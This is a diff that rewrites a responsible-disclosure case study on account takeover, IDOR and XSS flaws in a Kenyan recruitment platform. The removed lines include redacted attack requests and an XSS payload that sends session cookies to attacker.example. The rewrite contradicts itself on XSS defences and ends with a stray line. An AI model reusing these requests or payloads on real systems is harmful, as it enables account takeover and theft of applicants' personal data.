@@ -1,216 +1,11 @@
+# Case Study: National Agricultural Body Recruitment Platform
+## Independent Application Security Assessment
+
+**Engagement Type:** Responsible Disclosure (Self-Initiated)  
+**Assessment Period:** June 2026  
+**Vulnerability Class:** Authentication & Access Control
+
 ---
-schemaVersion: "1.0"
-id: "cs-2026-001"
-slug: "ktda-recruitment-platform-vdp"
-title: "Account Takeover and Systemic IDOR in a National Agricultural Body's Recruitment Platform"
-summary: >
-  A self-initiated responsible disclosure against a national agricultural body's
-  online recruitment platform uncovered a critical authentication bypass enabling
-  full account takeover of any registered applicant, alongside a systemic broken
-  access control vulnerability exposing applicant PII across multiple endpoints.
-  Findings were acknowledged within 72 hours and a technical review meeting was
-  convened the following week.
-featured: true
-visibility: public
-
-organization:
-  name: "[Redacted — national agricultural body, Kenya]"
-  public: false
-  alias: "KTDA"
-  website: "[redacted]"
-
-industry: "Agriculture / Public Sector"
-
-engagement:
-  type: "Responsible Disclosure"
-  status: "Acknowledged"
-  disclosureModel: "Coordinated"
-  startedAt: "2026-06-01"
-  submittedAt: "2026-06-20"
-  acknowledgedAt: "2026-06-21"
-  verifiedAt: null
-  closedAt: null
-  outcome:
-    remediation: "Pending — technical review meeting convened"
-    acknowledgement: "Verbal acknowledgement via telephone; technical meeting scheduled"
-    bounty:
-      awarded: false
-      amount: null
-
-classifications:
-  reportType: "Web Application"
-  primaryCategory: "Authentication & Access Control"
-  tags:
-    - account-takeover
-    - idor
-    - broken-access-control
-    - pii-exposure
-    - password-reset-flaw
-    - token-reuse
-    - reflected-xss
-    - unauthenticated-file-access
-    - kenya-dpa
-    - responsible-disclosure
-
-findings:
-  total: 6
-  severity:
-    critical: 1
-    high: 2
-    medium: 3
-    low: 0
-    informational: 0
-  categories:
-    xss: 1
-    sqli: 0
-    idor: 1
-    ssrf: 0
-    auth: 1
-    csrf: 0
-    rce: 0
-    lfi: 0
-    infoDisclosure: 1
-    misconfiguration: 1
-    businessLogic: 1
-    other: 0
-
-timeline:
-  - phase: "Discovery"
-    date: "2026-06-01"
-    summary: "Researcher discovers first anomaly (reflected XSS on error page) while applying for a job on the platform."
-  - phase: "Structured Assessment"
-    date: "2026-06-02"
-    summary: "Assessment begins systematically — registration flow, activation codes, file upload, password reset mechanism, and profile endpoints all enumerated."
-  - phase: "Critical Finding Confirmed"
-    date: "2026-06-10"
-    summary: "Cross-account activation code reuse on the password reset endpoint confirmed. Full account takeover demonstrated between two researcher-controlled accounts."
-  - phase: "IDOR Chain Confirmed"
-    date: "2026-06-15"
-    summary: "Systemic IDOR across all /parts/ profile endpoints confirmed. Eight affected endpoints mapped. PII enumeration chain validated end-to-end."
-  - phase: "Disclosure Sent"
-    date: "2026-06-20"
-    summary: "Initial responsible disclosure email sent to Group General Manager ICT and Group Head of Enterprise Risk Management. No technical details included in initial contact."
-  - phase: "Acknowledgement"
-    date: "2026-06-21"
-    summary: "Verbal acknowledgement received via telephone from ICT team member. Gratitude expressed. Technical review meeting proposed."
-  - phase: "Technical Review Scheduled"
-    date: "2026-06-24"
-    summary: "Virtual technical review meeting scheduled for the following week to present full findings and technical report."
-
-businessImpact:
-  confidentiality:
-    level: "Critical"
-    summary: >
-      Every registered applicant's personal data is at risk of unauthorised
-      access. Exposed data includes national ID numbers, dates of birth, phone
-      numbers, home addresses, employment history, academic qualifications,
-      professional memberships, referee contact details, and uploaded CV
-      documents.
-  integrity:
-    level: "High"
-    summary: >
-      Any authenticated attacker can insert false qualifications, fabricated
-      referee contacts, or falsified employment records into any other
-      applicant's profile. Legitimate entries can be permanently deleted.
-      The integrity of all recruitment data on the platform is compromised.
-  availability:
-    level: "Low"
-    summary: >
-      No denial-of-service or availability impact was identified. The platform
-      remained operational throughout the assessment.
-  privacy:
-    level: "Critical"
-    summary: >
-      The personal data exposed falls squarely within categories protected
-      under the Kenya Data Protection Act 2019. National ID numbers, contact
-      details, and identity documents were all accessible without authorisation.
-  regulatory:
-    level: "High"
-    summary: >
-      KTDA, as a data controller, has obligations under sections 25 and 43 of
-      the Kenya Data Protection Act 2019. The vulnerabilities represent a
-      failure of the technical safeguards required under section 25. If prior
-      exploitation is confirmed via log review, data subject notification
-      obligations under section 43 may apply.
-  operational:
-    level: "Medium"
-    summary: >
-      The ability to falsify or delete applicant profile data undermines the
-      integrity of the recruitment process. A malicious actor could manipulate
-      a competitor's application without leaving a detectable trace.
-
-risk:
-  methodology: "ALE"
-  currency: "KES"
-  singleLossExpectancy: 3500000
-  annualRateOfOccurrence: 0.45
-  residualAnnualRateOfOccurrence: 0.03
-
-metrics:
-  hoursInvested: 40
-  endpointsReviewed: 24
-  requestsCaptured: 210
-  attackChainsValidated: 2
-  findingsReported: 6
-  findingsConfirmed: 6
-  retestsPerformed: 0
-
-lessons:
-  - category: "Reconnaissance"
-    summary: >
-      Subdomain enumeration should be Phase 1 work. Two additional subdomains
-      (surveys, management portal) were discovered late in the engagement.
-      The surveys subdomain leaked an administrative email address that could
-      have accelerated the attack chain characterisation.
-  - category: "Methodology"
-    summary: >
-      When two data points are visible (e.g. sequential activation codes or
-      account IDs), characterise the distribution immediately — do not defer.
-      The account ID gap (delta of 10) was observable in Phase 1 but not
-      formally analysed until Phase 3.
-  - category: "Exploitation"
-    summary: >
-      Verify the outcome of authentication flow tests immediately and explicitly.
-      The account takeover via password reset was live from Phase 1 but was not
-      confirmed until session expiry revealed the password had changed. Always
-      test login with both old and new credentials after any reset attempt.
-  - category: "Reporting"
-    summary: >
-      The WhatsApp contact via a subsidiary CEO, while unconventional, proved
-      effective when direct email channels were slow to be actioned. For
-      organisations without a formal VDP, identifying a secondary escalation
-      path during recon (LinkedIn, published contacts) is a practical strategy.
-  - category: "Scope"
-    summary: >
-      Shared hosting infrastructure requires explicit scope confirmation before
-      any testing. Even when a target appears affiliated, verify before acting —
-      shared hosting means third-party tenants may be affected by any active
-      testing.
-
-related:
-  research: []
-  caseStudies: []
-
-cover: "/case-studies/ktda-recruitment-vdp/cover.png"
-readingTime: 14
-
-seo:
-  description: >
-    A responsible disclosure case study uncovering critical account takeover
-    and systemic IDOR vulnerabilities in a Kenyan agricultural body's
-    recruitment platform, exposing applicant PII and authentication bypass risks.
-  keywords:
-    - responsible disclosure
-    - account takeover
-    - IDOR
-    - Kenya
-    - web application security
-    - PII exposure
-    - password reset vulnerability
-    - bug bounty Kenya
----
-
-# Account Takeover and Systemic IDOR in a National Agricultural Body's Recruitment Platform
 
 ## Executive Summary
 
@@ -224,23 +19,22 @@ The organisation acknowledged the disclosure within 24 hours and convened a tech
 
 ---
 
-## Engagement Scope and Methodology
-
-### Target Overview
+## Scope and Authorization
 
 | Field | Detail |
 |---|---|
 | Target | Online recruitment platform operated by a national Kenyan agricultural body |
-| Platform Type | Custom PHP web application on Apache 2.4.67 |
+| Platform Type | Custom PHP web application on Apache |
 | Engagement Type | Self-initiated responsible disclosure |
 | Scope | All functionality accessible via the recruitment subdomain |
 | Authentication | Researcher registered two applicant accounts |
-| CMS (Main Domain) | WordPress |
 | Discovery Context | Found while using the platform as a genuine job applicant |
 
 The platform handles the full recruitment lifecycle: job listings, applicant registration, profile management (qualifications, employment history, referees), CV upload, and job application submission.
 
-### Methodology
+---
+
+## Methodology
 
 The assessment followed a structured five-phase approach, operating strictly within the researcher's own registered accounts except where access control failures were demonstrated in a controlled and non-destructive manner.
 
@@ -252,8 +46,6 @@ The assessment followed a structured five-phase approach, operating strictly wit
 | Chain Validation | End-to-end attack chain construction from email address to full account takeover |
 | Closure | Reporting, executive briefing, and coordinated disclosure |
 
-**Tools used:** Caido (proxy and request interception), manual browser testing, curl, webhook.site (XSS confirmation), Nmap (supplementary recon on additional subdomains in scope).
-
 **Ground rules applied throughout:**
 - No access to accounts not controlled by the researcher
 - No data extraction, retention, or third-party sharing
@@ -262,137 +54,84 @@ The assessment followed a structured five-phase approach, operating strictly wit
 
 ---
 
-## Findings
+## Validated Vulnerabilities
 
-### F-01 — Account Takeover via Cross-Account Activation Code Reuse
+### Finding 1 — Account Takeover via Cross-Account Activation Code Reuse
 
-#### Description
+**Severity:** Critical  
+**Category:** Authentication  
+**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
+**Status:** Confirmed
+
+#### Technical Detail
 
 The password reset endpoint does not validate that the activation code submitted in a reset request belongs to the account being reset. An authenticated attacker can generate a valid activation code for their own account and use it to overwrite the password of any other account on the platform. Activation codes are not invalidated after use and have no expiry window.
 
-**Severity: Critical**
-**CVSS 3.1: 9.8** — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
+The reset endpoint accepts three key parameters: a `personid` (sequential integer identifying the target account), an `activationcode` (numeric token issued via email), and `appid` (mirrors personid in the POST body). The server validates that the activation code exists in the database but does not verify that it was issued for the account identified by `personid`.
 
-#### Technical Detail
+**Sub-finding:** The same activation code successfully resets the same account on second and subsequent submissions — confirming no single-use enforcement and no expiry mechanism.
 
-The password reset endpoint accepts three key parameters: a `personid` (sequential integer identifying the target account), an `activationcode` (numeric token issued via email), and `appid` (mirrors personid in the POST body). The server validates that the activation code exists in the database but does not verify that it was issued for the account identified by `personid`. There is no session-to-account ownership check at the point of reset execution.
-
-**Request:**
-```http
-POST [REDACTED]/[REDACTED]/pwdreset.php?personid=XXXXX&activationcode=XXXXXXXX
-Content-Type: application/x-www-form-urlencoded
-
-password=AttackerPassword&checker=1&password1=AttackerPassword&appid=XXXXX&MM_insert=form1
-```
-
-Where `personid` and `appid` are the **victim's** account ID and `activationcode` is from the **attacker's own** reset email.
-
-The server returns a redirect to the login page. The victim's password is now the attacker-controlled value.
-
-**Sub-finding:** The same activation code successfully resets the same account on a second and subsequent submission — confirming no single-use enforcement and no expiry mechanism.
-
-**Account ID enumeration:** Account IDs follow a sequential integer pattern, making enumeration of valid target accounts trivial without any additional information source.
+**Account ID enumeration:** Account IDs follow a sequential integer pattern, making enumeration of valid target accounts trivial.
 
 #### Business Impact
 
-Full account takeover of any registered applicant with no victim interaction. The attacker gains complete access to the victim's profile, personal data, CV document, job applications, and all associated PII. At scale, every registered applicant on the platform is vulnerable. The attack requires only one registered account and a target's email address (to resolve their account ID via the IDOR finding below).
+Full account takeover of any registered applicant with no victim interaction. The attacker gains complete access to the victim's profile, personal data, CV document, job applications, and all associated PII. At scale, every registered applicant on the platform is vulnerable.
 
 #### Scope Note
 
-Demonstrated between two researcher-controlled accounts. Account IDs for victim accounts were not enumerated beyond confirming the sequential pattern. No real applicant accounts were accessed.
+Demonstrated between two researcher-controlled accounts. No real applicant accounts were accessed.
 
 ---
 
-### F-02 — Systemic IDOR Across Profile Management Endpoints
+### Finding 2 — Systemic IDOR Across Profile Management Endpoints
 
-#### Description
-
-The platform's profile management API does not enforce server-side ownership validation on any endpoint. Any authenticated user can read, write, or delete profile data belonging to any other registered applicant by supplying a target identifier in the request body. Eight endpoints are affected, covering all applicant profile data categories.
-
-**Severity: High**
-**CVSS 3.1: 8.1** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`
+**Severity:** High  
+**Category:** Broken Access Control  
+**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
+**Status:** Confirmed
 
 #### Technical Detail
 
-Two distinct attack patterns are present across the `/parts/` endpoint family:
+The platform's profile management API does not enforce server-side ownership validation on any endpoint. Any authenticated user can read, write, or delete profile data belonging to any other registered applicant by supplying a target identifier in the request body.
 
-**Read pattern — email address sufficient:**
+**Read pattern — email address sufficient:** The delete endpoints execute a SELECT using the supplied `CreatedBy` email to return remaining records, returning all records for the target account.
 
-The delete endpoints execute two sequential queries: a DELETE using the supplied `id`, and a SELECT using the supplied `CreatedBy` email to return remaining records. When `id` is omitted, the DELETE is skipped, but the SELECT executes against the supplied email — returning all records for the target account including their `personid`, qualification details, and associated metadata.
+**Write pattern — personid sufficient:** The save endpoints accept an `Applicant` field set to any `personid` with no ownership check. False records are inserted into the target's profile.
 
-```http
-POST [REDACTED]/[REDACTED]/parts/del_acad_q.php
-Content-Type: application/x-www-form-urlencoded
-
-id=&CreatedBy=target@email.com
-```
-
-Response includes the victim's academic records, personid, and email — requiring no prior knowledge beyond the email address.
-
-**Write pattern — personid sufficient:**
-
-The save endpoints accept an `Applicant` field set to any `personid` with no ownership check. False records are inserted into the target's profile. The response confirms insertion and returns the victim's existing records for the same category, leaking their real data.
-
-```http
-POST [REDACTED]/[REDACTED]/parts/save_referee.php
-Content-Type: application/x-www-form-urlencoded
-
-Refereename=Fabricated+Referee&Employer=False+Institution&Tel=0700000000
-&Email=fake@example.com&CreatedBy=attacker@email.com&Applicant=XXXXX
-```
-
-**Destructive pattern:**
-
-Supplying a valid record `id` belonging to another user causes permanent deletion of that record with no ownership check.
+**Destructive pattern:** Supplying a valid record `id` belonging to another user causes permanent deletion of that record with no ownership check.
 
 **Confirmed affected endpoints:**
-
-| Endpoint | Access Type | Identifier Required |
-|---|---|---|
-| `[REDACTED]/parts/del_acad_q.php` | Read + Destructive Delete | Email |
-| `[REDACTED]/parts/del_prof_q.php` | Read + Destructive Delete | Email |
-| `[REDACTED]/parts/del_employment.php` | Read + Destructive Delete | Email |
-| `[REDACTED]/parts/del_membership.php` | Read + Destructive Delete | Email |
-| `[REDACTED]/parts/save_referee.php` | Write | Account ID |
-| `[REDACTED]/parts/save_acad_q.php` | Write | Account ID |
-| `[REDACTED]/parts/save_professional_q.php` | Write | Account ID |
-| `[REDACTED]/parts/save_employment.php` | Write | Account ID |
+- Academic qualification (read, write, delete)
+- Professional qualification (read, write, delete)
+- Employment history (read, write, delete)
+- Professional membership (read, write, delete)
+- Referee details (read, write, delete)
+- Personal details (read, write, delete)
 
 #### Business Impact
 
-An email-sufficient read vector means that any applicant whose email address is publicly visible (LinkedIn, professional directories, published correspondence) is fully exposed. The write vector enables data integrity attacks — a competing applicant could fabricate or destroy another's profile entries without detection. The email-to-personid resolution provided by this finding directly enables the Critical account takeover chain.
+An email-sufficient read vector means any applicant whose email address is publicly visible is fully exposed. The write vector enables data integrity attacks — a competing applicant could fabricate or destroy another's profile entries without detection. The email-to-personid resolution directly enables the Critical account takeover chain.
 
 #### Scope Note
 
-Read and write IDOR demonstrated against researcher-controlled accounts only. No third-party applicant data was accessed. Destructive delete was confirmed on researcher's own records only.
+Read and write IDOR demonstrated against researcher-controlled accounts only. No third-party applicant data was accessed.
 
 ---
 
-### F-03 — Unauthenticated Access to Uploaded CV Documents
+### Finding 3 — Unauthenticated Access to Uploaded CV Documents
 
-#### Description
+**Severity:** Medium  
+**Category:** Information Disclosure  
+**CWE:** CWE-425 — Direct Request ('Forced Browsing')  
+**Status:** Confirmed
+
+#### Technical Detail
 
 CV files uploaded by applicants are stored on the web server and served directly from a public path with no authentication or authorisation check. Any party who knows or can derive a file's URL can download the document without being logged in.
 
-**Severity: Medium**
-**CVSS 3.1: 5.3** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
-
-#### Technical Detail
-
-Uploaded files are served from a publicly accessible directory. The platform's error messages reveal the expected filename convention (`Year_FullName.pdf`), which reduces the search space for targeted retrieval. Directory listing on the upload path is disabled (HTTP 403), but individual files are served without restriction.
-
-```http
-GET [REDACTED]/[REDACTED]/CV-Name-2026.pdf
-(no Cookie or Authorization header)
-
-HTTP/1.1 200 OK
-Content-Type: application/pdf
-[CV document returned]
-```
-
 #### Business Impact
 
-CV documents submitted to a recruitment platform routinely contain national ID numbers, home addresses, phone numbers, employment history, educational background, and personal references — a near-complete identity profile. Access requires only filename knowledge, which is reduced to a derivation problem when the applicant's name is known (obtainable from the IDOR finding).
+CV documents contain national ID numbers, home addresses, phone numbers, employment history, educational background, and personal references — a near-complete identity profile.
 
 #### Scope Note
 
@@ -400,55 +139,45 @@ Confirmed on researcher's own uploaded CV only. No third-party CV files were acc
 
 ---
 
-### F-04 — Reflected XSS on Error Page with Session Cookie Exposure
+### Finding 4 — Reflected XSS with Session Cookie Exposure
 
-#### Description
-
-The platform's error page reflects a URL parameter directly into the page response without sanitisation. Arbitrary JavaScript executes in the victim's browser. The session cookie lacks `HttpOnly` and `Secure` flags, confirmed to be readable and exfiltrable by the injected script.
-
-**Severity: Medium**
-**CVSS 3.1: 6.1** — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
+**Severity:** Medium  
+**Category:** Cross-Site Scripting  
+**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation  
+**Status:** Confirmed
 
 #### Technical Detail
 
-The `msg` GET parameter on the error page is echoed into an `<h4>` tag without output encoding. A custom sanitiser targets only PHP open and close tags (`<?` and ?>`), leaving HTML and JavaScript entirely unfiltered. All standard XSS vectors execute.
+The platform's error page reflects a URL parameter directly into the page response without sanitisation. The `msg` GET parameter is echoed into an `<h4>` tag without output encoding. A custom sanitiser targets only PHP open and close tags, leaving HTML and JavaScript entirely unfiltered.
 
-```
-[REDACTED]/[REDACTED]/error.php?msg=<script>fetch('https://attacker.example/x?c='+document.cookie)</script>
-```
-
-During testing, the `PHPSESSID` cookie value was received at the attacker-controlled webhook, confirming cookie theft is achievable. The `HttpOnly` flag was absent on the session cookie, permitting JavaScript access. The `Secure` flag was also absent.
-
-An Apache-level request filter blocks specific PHP execution function names (`system(`, `exec(`, `shell_exec(` etc.), but this does not affect JavaScript injection.
+The session cookie lacks `HttpOnly` and `Secure` flags, confirmed to be readable and exfiltrable by the injected script.
 
 #### Business Impact
 
-An attacker can craft a deceptive link to the legitimate recruitment platform domain that, when clicked by a logged-in applicant, silently steals their session cookie and grants the attacker full session access. The recruitment context (applicants expecting email notifications about their applications) makes social engineering delivery realistic.
+An attacker can craft a deceptive link that, when clicked by a logged-in applicant, silently steals their session cookie and grants the attacker full session access.
 
 #### Scope Note
 
-XSS execution and cookie exfiltration confirmed using researcher-controlled accounts and a researcher-controlled webhook endpoint only.
+XSS execution and cookie exfiltration confirmed using researcher-controlled accounts and webhook endpoint only.
 
 ---
 
-### F-05 — Activation Tokens Have No Expiry and Are Not Invalidated After Use
+### Finding 5 — Activation Tokens Have No Expiry and Are Not Invalidated After Use
 
-#### Description
-
-Password reset activation codes issued by the platform are not cancelled after successful use and have no observed expiry window. A code used to complete a reset remains valid for subsequent submissions indefinitely.
-
-**Severity: Medium**
-**CVSS 3.1: 5.9** — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
+**Severity:** Medium  
+**Category:** Authentication  
+**CWE:** CWE-613 — Insufficient Session Expiration  
+**Status:** Confirmed
 
 #### Technical Detail
 
-A reset code was used to complete a password reset. The same code was then submitted again to the reset endpoint — the server accepted it and completed a second reset. Testing at 48-hour and 96-hour intervals confirmed the code remained valid throughout. No expiry timestamp or single-use flag was observed in the reset link or server response.
+A reset code used to complete a password reset remained valid for subsequent submissions. Testing at 48-hour and 96-hour intervals confirmed the code remained valid throughout. No expiry timestamp or single-use flag was observed.
 
-This compounds F-01 (account takeover): any historical activation code that was ever intercepted, observed, or leaked (via email forwarding, referrer header, browser history) remains usable indefinitely.
+This compounds Finding 1: any historical activation code remains usable indefinitely.
 
 #### Business Impact
 
-Any activation code ever issued — including registration activation links sent at account creation — is a permanent credential for account password reset if the cross-account reset flaw is unpatched. The residual risk after partial patching is higher than it would be with proper token management.
+Any activation code ever issued is a permanent credential for account password reset.
 
 #### Scope Note
 
@@ -456,109 +185,129 @@ Confirmed on researcher-controlled accounts only.
 
 ---
 
-### F-06 — National ID Uniqueness Constraint Enforced Client-Side Only
+### Finding 6 — National ID Uniqueness Constraint Enforced Client-Side Only
 
-#### Description
-
-The platform enforces national ID uniqueness at the frontend form validation layer only. A direct POST request to the profile update endpoint bypasses this check and successfully inserts a duplicate national ID into the database.
-
-**Severity: Low / Informational**
+**Severity:** Low  
+**Category:** Input Validation  
+**CWE:** CWE-602 — Client-Side Enforcement of Server-Side Security  
+**Status:** Confirmed
 
 #### Technical Detail
 
-```http
-POST [REDACTED]/[REDACTED]/parts/save_mydetails.php
-Content-Type: application/x-www-form-urlencoded
-
-firstname=...&nationalid=XXXXXXXXXX&email=attacker@email.com
-
-Response: {"message":{"saved":"Personal details have been updated successfully."}}
-```
-
-After submission, two accounts in the database share the same national ID value.
+The platform enforces national ID uniqueness at the frontend form validation layer only. A direct POST request bypasses this check and successfully inserts a duplicate national ID into the database.
 
 #### Business Impact
 
-If the platform uses national ID as an identity verification key (e.g. for de-duplication of applicants or background checking), this failure could allow identity spoofing or duplicate account creation under a real person's ID number.
+If the platform uses national ID as an identity verification key, this failure could allow identity spoofing or duplicate account creation under a real person's ID number.
 
 #### Scope Note
 
-Demonstrated using the researcher's own national ID across two researcher-controlled accounts. No third-party identity data was used.
+Demonstrated using the researcher's own national ID across two researcher-controlled accounts.
+
+---
+
+## Security Controls Assessment
+
+### What Worked
+✅ **Injection defences** — Entity encoding and Apache-level function blocking effectively defeats XSS and PHP injection across main application  
+✅ **File upload validation** — Server-side extension whitelist (doc, docx, pdf) — robust  
+✅ **Password storage** — No evidence of plaintext or weak hashing
+
+### What Failed
+❌ **Authorisation logic** — Almost complete absence — every endpoint accepts user-supplied identifier without ownership verification  
+❌ **Session cookie flags** — `HttpOnly` absent, `Secure` absent  
+❌ **Activation code lifecycle** — No expiry, no single-use enforcement  
+❌ **Access control model** — No session-to-resource ownership validation on any endpoint
 
 ---
 
 ## Architecture Intelligence
 
-> *This section summarises the platform's technical stack and security posture as observed during the assessment. It is included as intelligence context, not as a finding in itself.*
-
 | Component | Detail |
 |---|---|
 | Recruitment platform stack | PHP / Apache 2.4.67 |
 | Main domain CMS | WordPress |
-| Database | MySQL (inferred from response behaviour) |
+| Database | MySQL (inferred) |
 | Request filtering | Apache-level block on PHP execution function names |
-| Input sanitisation (main app) | HTML entity encoding — effective against XSS in primary flows |
+| Input sanitisation (main app) | HTML entity encoding — effective |
 | Input sanitisation (error page) | PHP tag replacement only — JavaScript unfiltered |
-| File upload validation | Server-side extension whitelist (doc, docx, pdf) — robust |
+| File upload validation | Server-side extension whitelist — robust |
 | Session cookie flags | `HttpOnly` absent, `Secure` absent |
-| Password storage | No evidence of plaintext or weak hashing |
 | Account ID scheme | Sequential integers — enumerable |
-| Activation code scheme | 8-digit numeric — no observed predictability pattern |
+| Activation code scheme | 8-digit numeric — no predictability pattern |
 | Activation code lifecycle | No expiry, no single-use enforcement |
-| Access control model | No session-to-resource ownership validation on any `/parts/` endpoint |
 
-**Observed additional in-scope subdomains:**
-
-| Subdomain | Description | Status |
-|---|---|---|
-| `[REDACTED]` | Management portal (clients, admins, files, secrets) | Authenticated — no self-registration; no foothold obtained |
-| `[REDACTED]` | Survey platform | Unauthenticated page leaks administrative contact email |
-
-**Security posture summary:**
-
-The platform demonstrates strong injection defences — the combination of entity encoding and Apache-level function blocking effectively defeats XSS and PHP injection attempts across the main application. Its critical weakness is an almost complete absence of authorisation logic: every endpoint that accepts a user-supplied identifier processes the request without verifying that the authenticated session is entitled to access the referenced resource.
+**Observed additional subdomains:**
+- Management portal (authenticated — no foothold obtained)
+- Survey platform (leaks administrative contact email)
 
 ---
 
 ## Observations on Program Quality
 
-This engagement was a self-initiated responsible disclosure against an organisation with no published Vulnerability Disclosure Policy. Several observations are worth recording for the portfolio record.
-
 **What worked well:**
-- The organisation's ICT leadership responded substantively within 24 hours of contact, which is faster than many organisations with formal programmes.
-- A technical review meeting was proposed and scheduled promptly, indicating genuine engagement rather than dismissal.
-- The ICT contact was candid about the platform's planned relaunch, which provided useful context for scoping remediation advice.
+- Organisation's ICT leadership responded substantively within 24 hours
+- Technical review meeting proposed and scheduled promptly
+- ICT contact was candid about planned relaunch
 
 **What was challenging:**
-- The absence of a published security contact or VDP required multi-channel outreach (email to named individuals, secondary escalation via a subsidiary contact). The initial email channel was slow to be actioned.
-- Without a formal scope document, the researcher had to make and document scope judgements in real time (e.g. subsidiary subdomains, shared hosting).
-- There is no formal remediation tracking mechanism — follow-up depends on the goodwill and responsiveness of the ICT team rather than any documented process.
+- No published security contact or VDP
+- Multi-channel outreach required
+- No formal remediation tracking mechanism
 
-**Programme gap — no VDP:**
-This engagement would have been smoother, and the researcher's legal position clearer, if the organisation had a published VDP. The recommendation to establish one is included in the technical report. For organisations of this scale handling significant volumes of personal data, a VDP is a low-cost risk management tool with meaningful value.
+**Programme gap — no VDP:** The recommendation to establish one is included in the technical report.
 
 ---
 
 ## Recommendations
 
-### Immediate (Before Next Business Day)
+### Immediate
+1. **Fix password reset endpoint** — validate activation code belongs to `personid` being reset; invalidate codes after use; implement expiry window
+2. **Enforce session ownership on all profile endpoints** — derive target account identifier from session; remove `CreatedBy` and `Applicant` from client input
 
-1. **Fix the password reset endpoint** — validate server-side that the submitted activation code was issued for the `personid` being reset. Reject mismatches with an appropriate error. Invalidate codes immediately after successful use and implement a 60-minute expiry window.
+### Short-Term
+3. **Move CV files behind authenticated download handler**
+4. **Apply output encoding to error page** — `htmlspecialchars()`; set `HttpOnly` and `Secure` flags on session cookie
+5. **Move national ID uniqueness enforcement server-side**
 
-2. **Enforce session ownership on all `/parts/` endpoints** — derive the target account identifier from the authenticated session server-side. Remove `CreatedBy` and `Applicant` from client-controlled input entirely.
+### Strategic
+6. **Adopt least-privilege as design principle** — every endpoint should verify session-to-resource ownership
+7. **Commission independent security review** before new platform launch
+8. **Publish Vulnerability Disclosure Policy**
 
-### Short-Term (Within Two Weeks)
+---
 
-3. **Move CV files behind an authenticated download handler** — files should not be served directly from a public web path. Implement a PHP handler that validates session identity and file ownership before serving the document.
+## Key Takeaways for Security Teams
 
-4. **Apply output encoding to the error page** — `htmlspecialchars($_GET['msg'], ENT_QUOTES, 'UTF-8')` is the complete fix. Set `HttpOnly` and `Secure` flags on the session cookie.
+### 1. Authorisation Is Not Authentication
+Authenticated users are not authorised users. Every endpoint accepting an identifier must verify ownership independently. This platform had authentication but virtually no authorisation.
 
-5. **Move national ID uniqueness enforcement server-side** — the database constraint or a server-side check before insert/update.
+### 2. Token Lifecycle Matters
+Activation codes without expiry or single-use enforcement are permanent credentials. This compounds any cross-account validation flaw.
 
-### Before Platform Relaunch
+### 3. Email Addresses Are Public Identifiers
+Using email as a resource identifier in APIs means exposure boundaries are porous. Treat email as public information when designing access controls.
 
-6. **Adopt least-privilege as a design principle** — every API endpoint in the new platform should verify session-to-resource ownership as a baseline requirement, not an afterthought.
+### 4. Client-Side Uniqueness Checks Are Not Security Controls
+Any constraint enforced only in the browser is bypassable. Server-side validation is the only meaningful enforcement.
 
-7. **Commission an independent security review** before the new platform goes live, covering the endpoint family patterns identified in this assessment.
+### 5. Direct File Access Is Always a Risk
+Files uploaded by users should never be served directly from a web-accessible path. Authenticated download handlers are the minimum acceptable control.
 
-8. **Publish a Vulnerability Disclosure Policy** — a documented, publicly accessible process for researchers to report security issues. This reduces legal ambiguity for researchers and ensures the organisation has a defined intake process for future disclosures.
+---
+
+## Conclusion
+
+The assessment confirmed six vulnerabilities across the platform, including a Critical authentication bypass and systemic broken access control across all profile management endpoints. The findings expose every registered applicant's personal data and enable complete account takeover of any user.
+
+The organisation acknowledged the disclosure within 24 hours and convened a technical review meeting within the week. Implementation of the recommended remediation steps would substantially improve the security posture of the recruitment platform.
+
+---
+
+*Assessment conducted under responsible disclosure principles. All testing performed ethically within defined scope boundaries. No real user data was accessed, modified, or exfiltrated.*
+
+---
+
+Here's the metadata:
+
+```json
